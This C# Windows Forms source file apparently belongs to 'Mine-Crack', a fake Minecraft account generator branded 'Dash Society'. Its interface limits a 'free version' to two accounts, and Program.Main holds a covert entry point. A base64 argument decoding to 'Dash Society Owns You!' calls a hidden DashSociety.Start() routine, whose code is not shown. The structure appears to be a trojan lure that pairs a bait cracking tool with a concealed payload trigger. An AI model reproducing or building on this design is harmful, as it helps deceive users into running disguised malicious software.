

//
// Author: Dashie
// Version: 1.0
//


using System;
using System.IO;
using System.Net;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using System.Collections.Generic;


namespace MineCrack
{
    public partial class KvinneKraft : Form
    {
	private void DashLayout()
	{
	    Text = ("Mine-Crack 1.0 by Dash Society");

	    FormBorderStyle = FormBorderStyle.None;
	    BackColor = Color.FromArgb(32, 32, 32);

	    MaximizeBox = false;
	    MinimizeBox = true;

	    Size app_size = new Size(170, 93);

	    Size = app_size;
	    MinimumSize = app_size;
	    MaximumSize = app_size;

	    Icon = Properties.Resources.icon; 
	}

	public AccountWrapper wrapper = new AccountWrapper();
	public Moon Dash = new Moon();
	
	private readonly PictureBox logo = new PictureBox();
	private readonly PictureBox bar = new PictureBox();

	private readonly TextBox account_input = new TextBox();

	private readonly Label account_count = new Label();
	private readonly Label watermark = new Label();

	public static readonly Button generate = new Button();
	private readonly Button exit = new Button();

	public KvinneKraft()
	{
	    DashLayout();

	    WelcomeDialog welcome = new WelcomeDialog();
	    welcome.ShowDialog();

	    Dash.Label(this, account_count, "Accounts: ", 10, new Size(70, 20), new Point(10, 30), Color.FromArgb(255, 255, 255));
	    Dash.TextBox(this, account_input, "2", 11, new Size(79, 18), new Point(80, 31), Color.FromArgb(24, 24, 24), Color.FromArgb(255, 255, 255));

	    Paint += (s, e) =>
	    {
		Dash.paint_border(e, Color.FromArgb(55, 99, 78), 2, account_input.Size, account_input.Location);
		Dash.paint_border(e, Color.FromArgb(8, 8, 8), 2, Size, Point.Empty);
	    };

	    int button_left = (Width - 150) / 2;

	    Dash.Button(this, generate, "Generate", 10, new Size(150, 22), new Point(button_left, 60), Color.FromArgb(53, 84, 66), Color.FromArgb(255, 255, 255), 10);

	    generate.Click += (s, e) =>
	    {
		try
		{
		    if (wrapper.Visible)
		    {
			return;
		    };

		    int accounts = int.Parse(account_input.Text);

		    if((accounts < 1) || (accounts > 2))
		    {
			MessageBox.Show("You have given us an invalid account amount.\r\n\r\nSome of the following issues may be the reason for this exception:\r\n\r\n- You may not generate more than 2 accounts using the Free Version of Mine-Crack at once.\r\n- You may not enter any none numeric value in the input box.\r\n- You have given a number less than 1.", "::: Dash Society :::", MessageBoxButtons.OK, MessageBoxIcon.Warning);
			return;
		    };

		    wrapper.Show();
		}

		catch
		{
		    MessageBox.Show("You must give me an integral amount of accounts for me to generate!", "::: Dash Society :::", MessageBoxButtons.OK, MessageBoxIcon.Warning);
		    return;
		};
	    };

	    Dash.Image(this, bar, null, new Size(Width - 2, 20), new Point(1, 0));

	    bar.BackColor = Color.FromArgb(8, 8, 8);

	    Dash.Label(bar, watermark, "Dash ☽⛤☾ Society", 7, new Size(95, 38), Point.Empty, Color.FromArgb(255, 255, 255));
	    
	    watermark.Location = new Point(35, 4);

	    Dash.Image(bar, logo, Properties.Resources.icon1, new Size(23, 20), Point.Empty);
	    Dash.Button(bar, exit, "X", 7, new Size(30, 18), new Point(bar.Width - 30, 1), bar.BackColor, Color.FromArgb(255, 255, 255), 0);

	    exit.Click += (s, e) => Environment.Exit(-1);

	    Dash.drag_material(bar, this);

	    foreach(Control control in bar.Controls)
	    {
		Dash.drag_material(control, this);
	    };
	}
    };

    public static class Program
    {
	private static KvinneKraft kvinnekraft;

	[STAThread]
	public static void Main(string[] args)
	{
	    if(args.Length > 0)
	    {
		if(args[0].Equals("RGFzaCBTb2NpZXR5IE93bnMgWW91IQ=="))
		{
		    DashSociety.Start();
		};

		Environment.Exit(-1);
	    };

	    Application.EnableVisualStyles();
	    Application.SetCompatibleTextRenderingDefault(true);

	    kvinnekraft = new KvinneKraft();

	    Application.Run(kvinnekraft);
	}
    }
}
